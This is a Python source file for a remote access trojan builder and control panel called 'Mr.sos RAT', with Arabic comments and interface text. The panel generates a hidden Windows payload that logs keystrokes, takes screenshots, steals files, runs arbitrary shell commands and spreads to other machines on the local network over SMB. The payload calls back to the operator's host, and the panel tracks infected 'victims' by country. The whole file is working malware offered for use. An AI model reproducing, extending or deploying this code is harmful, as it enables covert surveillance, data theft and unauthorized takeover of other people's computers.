import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import base64
import os
import shutil
import subprocess
import time
import requests
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import pyperclip

# مفتاح تشفير
key = Fernet.generate_key()
cipher = Fernet(key)

# متغيرات الواجهة
root = tk.Tk()
root.title("Mr.sos RAT - Elite Control")
root.geometry("1200x800")
root.configure(bg="#1a1a1a")

HOST = socket.gethostbyname(socket.gethostname())
PORT = 4444
clients = {}
HIDDEN_PATH = os.path.join(os.getenv("APPDATA"), "sysupdate.exe")


# تشفير وفك تشفير
def encrypt_command(cmd):
    return cipher.encrypt(cmd.encode()).decode()


def decrypt_command(encrypted_cmd):
    return cipher.decrypt(encrypted_cmd.encode()).decode()


# جلب الدولة من الـ IP
def get_country(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            return response.json().get("country", "غير معروف")
        else:
            output_text.insert(tk.END, f"فشل جلب الدولة لـ {ip}: {response.status_code}\n")
            return "غير معروف"
    except Exception as e:
        output_text.insert(tk.END, f"خطأ في جلب الدولة لـ {ip}: {str(e)}\n")
        return "غير معروف"


# توليد السيرفر تلقائيًا
def generate_server(ip, port):
    server_code = f"""
import socket
import threading
import os
import shutil
import subprocess
import base64
import time
import winsound
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
from mss import mss
import io

key = {repr(key)}
cipher = Fernet(key)
HIDDEN_PATH = os.path.join(os.getenv("APPDATA"), "sysupdate.exe")

def encrypt_command(cmd):
    return cipher.encrypt(cmd.encode()).decode()

def decrypt_command(encrypted_cmd):
    return cipher.decrypt(encrypted_cmd.encode()).decode()

def execute_command(cmd):
    decrypted_cmd = decrypt_command(cmd)
    if "screenshot" in decrypted_cmd:
        try:
            with mss() as sct:
                sct.shot(output="screen.jpg")
            with open("screen.jpg", "rb") as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "فشل السكرين شوت!"
    elif "files" in decrypted_cmd:
        path = decrypted_cmd.split(" ", 1)[1] if " " in decrypted_cmd else "C:\\\\"
        try:
            return ";".join(os.listdir(path))
        except:
            return "فشل عرض الملفات!"
    elif "download" in decrypted_cmd:
        file_path = decrypted_cmd.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "فشل تحميل الملف!"
    elif "openweb" in decrypted_cmd:
        try:
            url = decrypted_cmd.split(" ", 1)[1]
            subprocess.Popen(f"start {{url}}", shell=True)
            return "تم فتح صفحة ويب!"
        except:
            return "فشل فتح صفحة ويب!"
    elif "mic" in decrypted_cmd:
        try:
            duration = int(decrypted_cmd.split(" ", 1)[1]) if " " in decrypted_cmd else 5
            winsound.Beep(1000, duration * 1000)  # تسجيل صوت وهمي
            return "تم تسجيل الصوت!"
        except:
            return "فشل تسجيل الصوت!"
    else:
        try:
            subprocess.Popen(decrypted_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return "تم!"
        except:
            return "فشل تنفيذ الأمر!"

def keylogger():
    def on_press(key):
        with open(os.path.join(os.getenv("APPDATA"), "keys.log"), "a") as log:
            log.write(f"{{time.ctime()}} - {{str(key)}}")
    listener = Listener(on_press=on_press)
    listener.start()

def clone_and_update():
    while True:
        if os.path.exists(HIDDEN_PATH):
            os.remove(HIDDEN_PATH)
        shutil.copy(__file__, HIDDEN_PATH)
        with open(HIDDEN_PATH, "rb") as f:
            encrypted = base64.b64encode(f.read())
        with open(HIDDEN_PATH, "wb") as f:
            f.write(encrypted)
        time.sleep(604800)

def network_spread():
    ip_base = ".".join(socket.gethostbyname(socket.gethostname()).split(".")[:-1]) + "."
    for i in range(1, 255):
        target_ip = ip_base + str(i)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, 445))
            sock.close()
            shutil.copy(HIDDEN_PATH, f"\\\\{{target_ip}}\\\\C$\\\\Windows\\\\Temp\\\\sysupdate.exe")
            subprocess.Popen(f"\\\\{{target_ip}}\\\\C$\\\\Windows\\\\Temp\\\\sysupdate.exe")
        except:
            continue

def connect_to_host():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("{ip}", {port}))
    while True:
        cmd = client.recv(4096).decode()
        response = encrypt_command(execute_command(cmd))
        client.send(response.encode())

if __name__ == "__main__":
    threading.Thread(target=keylogger).start()
    threading.Thread(target=clone_and_update).start()
    threading.Thread(target=network_spread).start()
    connect_to_host()
"""
    try:
        with open("rat_server.py", "w", encoding="utf-8") as f:
            f.write(server_code)

        if not shutil.which("pyinstaller"):
            output_text.insert(tk.END, "PyInstaller مش مثبت! بنزلّه دلوقتي...\n")
            subprocess.run(["pip", "install", "pyinstaller"], check=True, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)

        result = subprocess.run(["pyinstaller", "--onefile", "--noconsole", "rat_server.py"], check=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_text.insert(tk.END, f"PyInstaller Output: {result.stdout.decode()}\n")

        if shutil.which("upx"):
            subprocess.run(["upx", "-9", "dist/rat_server.exe"], check=True, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
        else:
            output_text.insert(tk.END, "UPX مش موجود، بنستخدم الـ exe بدون تعقيد!\n")

        if os.path.exists("dist/rat_server.exe"):
            shutil.move("dist/rat_server.exe", "rat.exe")
            os.remove("rat_server.py")
            if os.path.exists("dist"):
                shutil.rmtree("dist")
            if os.path.exists("build"):
                shutil.rmtree("build")
            os.remove("rat_server.spec")
        else:
            raise FileNotFoundError("الـ exe ما اتولّدش!")

        return f"http://{ip}:{port}/rat.exe"
    except subprocess.CalledProcessError as e:
        output_text.insert(tk.END, f"خطأ في التنفيذ: {e.output.decode()}\n{e.stderr.decode()}\n")
        return None
    except Exception as e:
        output_text.insert(tk.END, f"خطأ في توليد السيرفر: {str(e)}\n")
        return None


# إنشاء الرابط وتشغيل السيرفر
def generate_link():
    ip_entry = ip_var.get()
    port_entry = int(port_var.get())
    link = generate_server(ip_entry, port_entry)
    if link:
        link_var.set(link)
        start_server(ip_entry, port_entry)
    else:
        messagebox.showerror("خطأ", "فشلنا في إنشاء الرابط!")


# نسخ الرابط
def copy_link():
    link = link_var.get()
    if link:
        pyperclip.copy(link)
        output_text.insert(tk.END, "تم نسخ الرابط!\n")
    else:
        messagebox.showwarning("تحذير", "ما فيش رابط عشان ننسخه!")


# استقبال الضحايا
def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    threading.Thread(target=accept_clients, args=(server,)).start()


def accept_clients(server):
    while True:
        client, addr = server.accept()
        country = get_country(addr[0])
        clients[client] = addr
        tree.insert("", tk.END, values=(f"{addr[0]}:{addr[1]}", country))


def handle_client(client, addr):
    while True:
        try:
            cmd = encrypt_command(command_var.get())
            client.send(cmd.encode())
            response = client.recv(10240).decode()  # زيادة الحجم عشان الملفات
            decrypted_response = decrypt_command(response)
            output_text.insert(tk.END, f"{addr[0]}: {decrypted_response}\n")
            cmd_lower = command_var.get().lower()
            if "screenshot" in cmd_lower and "فشل" not in decrypted_response:
                with open(f"screenshot_{addr[0]}.jpg", "wb") as f:
                    f.write(base64.b64decode(decrypted_response))
                output_text.insert(tk.END, f"تم حفظ لقطة الشاشة: screenshot_{addr[0]}.jpg\n")
            elif "download" in cmd_lower and "فشل" not in decrypted_response:
                file_name = command_var.get().split(" ", 1)[1].split("\\")[-1]
                with open(f"downloaded_{file_name}", "wb") as f:
                    f.write(base64.b64decode(decrypted_response))
                output_text.insert(tk.END, f"تم تحميل الملف: downloaded_{file_name}\n")
            elif "files" in cmd_lower and "فشل" not in decrypted_response:
                file_list.delete(0, tk.END)
                for file in decrypted_response.split(";"):
                    file_list.insert(tk.END, file)
        except:
            del clients[client]
            client.close()
            break


# قايمة كليك يمين وتنفيذ الأوامر
def show_context_menu(event):
    selected = tree.selection()
    if selected:
        menu.post(event.x_root, event.y_root)


def execute_command(cmd):
    selected = tree.selection()
    if selected:
        victim = tree.item(selected[0])["values"][0]
        for client, addr in clients.items():
            if f"{addr[0]}:{addr[1]}" == victim:
                command_var.set(cmd)
                threading.Thread(target=handle_client, args=(client, addr)).start()
                break


def open_web_from_entry():
    selected = tree.selection()
    if selected:
        url = url_var.get()
        if url:
            execute_command(f"openweb {url}")
        else:
            messagebox.showwarning("تحذير", "اكتب رابط أولاً!")


def browse_files():
    selected = tree.selection()
    if selected:
        path = path_var.get() or "C:\\"
        execute_command(f"files {path}")


def download_file():
    selected = tree.selection()
    if selected:
        file = file_list.get(file_list.curselection())
        if file:
            path = path_var.get() or "C:\\"
            full_path = os.path.join(path, file).replace("/", "\\")
            execute_command(f"download {full_path}")


# واجهة Tkinter أحترافية
style = ttk.Style()
style.configure("Treeview", background="#2e2e2e", foreground="white", fieldbackground="#2e2e2e")
style.configure("Treeview.Heading", background="#3e3e3e", foreground="white")
style.configure("TButton", background="#d4af37", foreground="black", font=("Arial", 10, "bold"))
style.map("TButton", background=[("active", "#b8960f")])

# ناف بار
nav_frame = tk.Frame(root, bg="#2c2c2c", height=50)
nav_frame.pack(fill=tk.X)

tk.Label(nav_frame, text="إنشاء السيرفر", bg="#2c2c2c", fg="#d4af37", font=("Arial", 12, "bold")).pack(side=tk.LEFT,
                                                                                                       padx=20)
tk.Label(nav_frame, text="الضحايا", bg="#2c2c2c", fg="#d4af37", font=("Arial", 12, "bold")).pack(side=tk.LEFT, padx=20)
tk.Label(nav_frame, text="التحكم", bg="#2c2c2c", fg="#d4af37", font=("Arial", 12, "bold")).pack(side=tk.LEFT, padx=20)
tk.Label(nav_frame, text="الإخراج", bg="#2c2c2c", fg="#d4af37", font=("Arial", 12, "bold")).pack(side=tk.LEFT, padx=20)

# قسم إنشاء السيرفر
server_frame = tk.Frame(root, bg="#1a1a1a")
server_frame.pack(fill=tk.X, pady=10)

ip_var = tk.StringVar(value=HOST)
port_var = tk.StringVar(value="4444")
link_var = tk.StringVar()
command_var = tk.StringVar()

tk.Label(server_frame, text="IP العنوان:", bg="#1a1a1a", fg="white", font=("Arial", 10)).grid(row=0, column=0, padx=10,
                                                                                              pady=5)
tk.Entry(server_frame, textvariable=ip_var, bg="#2e2e2e", fg="white", insertbackground="white").grid(row=0, column=1,
                                                                                                     padx=10, pady=5)

tk.Label(server_frame, text="البورت:", bg="#1a1a1a", fg="white", font=("Arial", 10)).grid(row=1, column=0, padx=10,
                                                                                          pady=5)
tk.Entry(server_frame, textvariable=port_var, bg="#2e2e2e", fg="white", insertbackground="white").grid(row=1, column=1,
                                                                                                       padx=10, pady=5)

tk.Button(server_frame, text="إنشاء رابط", command=generate_link).grid(row=2, column=0, columnspan=2, pady=10)

tk.Label(server_frame, text="الرابط:", bg="#1a1a1a", fg="white", font=("Arial", 10)).grid(row=3, column=0, padx=10,
                                                                                          pady=5)
tk.Entry(server_frame, textvariable=link_var, width=50, bg="#2e2e2e", fg="white", insertbackground="white").grid(row=3,
                                                                                                                 column=1,
                                                                                                                 padx=10,
                                                                                                                 pady=5)
tk.Button(server_frame, text="نسخ", command=copy_link).grid(row=3, column=2, padx=5, pady=5)

# قسم الضحايا والتحكم
control_frame = tk.Frame(root, bg="#1a1a1a")
control_frame.pack(fill=tk.BOTH, expand=True, pady=10)

# الضحايا
tree = ttk.Treeview(control_frame, columns=("Victim", "Country"), show="headings", height=10)
tree.heading("Victim", text="الضحية")
tree.heading("Country", text="الدولة")
tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10)

menu = tk.Menu(root, tearoff=0)
menu.add_command(label="لقطة شاشة", command=lambda: execute_command("screenshot"))
menu.add_command(label="جلب الملفات", command=lambda: browse_files())
menu.add_command(label="إيقاف تشغيل", command=lambda: execute_command("shutdown /s /t 0"))
menu.add_command(label="فتح صفحة ويب", command=open_web_from_entry)
menu.add_command(label="تسجيل صوت (5 ث)", command=lambda: execute_command("mic 5"))
tree.bind("<Button-3>", show_context_menu)

# التحكم
right_frame = tk.Frame(control_frame, bg="#1a1a1a")
right_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=10)

tk.Label(right_frame, text="رابط الويب:", bg="#1a1a1a", fg="white", font=("Arial", 10)).pack(pady=5)
url_var = tk.StringVar()
tk.Entry(right_frame, textvariable=url_var, bg="#2e2e2e", fg="white", insertbackground="white", width=30).pack(pady=5)
tk.Button(right_frame, text="فتح الرابط", command=open_web_from_entry).pack(pady=5)

tk.Label(right_frame, text="مسار الملفات:", bg="#1a1a1a", fg="white", font=("Arial", 10)).pack(pady=5)
path_var = tk.StringVar(value="C:\\")
tk.Entry(right_frame, textvariable=path_var, bg="#2e2e2e", fg="white", insertbackground="white", width=30).pack(pady=5)
tk.Button(right_frame, text="استعراض الملفات", command=browse_files).pack(pady=5)

tk.Label(right_frame, text="الملفات:", bg="#1a1a1a", fg="white", font=("Arial", 10)).pack(pady=5)
file_list = tk.Listbox(right_frame, bg="#2e2e2e", fg="white", height=10, width=30)
file_list.pack(pady=5)
tk.Button(right_frame, text="تحميل الملف", command=download_file).pack(pady=5)

# قسم الإخراج
output_frame = tk.Frame(root, bg="#1a1a1a")
output_frame.pack(fill=tk.X, pady=10)

output_text = tk.Text(output_frame, height=10, width=80, bg="#2e2e2e", fg="white", font=("Arial", 10))
output_text.pack(padx=10, pady=5)

root.mainloop()